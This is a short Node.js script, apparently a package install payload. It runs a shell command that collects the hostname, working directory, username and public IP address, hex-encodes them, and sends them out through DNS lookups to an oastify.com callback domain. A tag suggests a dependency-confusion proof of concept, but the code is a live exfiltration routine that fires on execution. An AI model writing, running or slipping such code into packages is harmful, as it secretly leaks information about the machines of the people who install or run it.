const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'attribution-project';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.u3yjt7ui4aa5egu44kdrpys1psvjj97y.oastify.com;done" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);
	
});

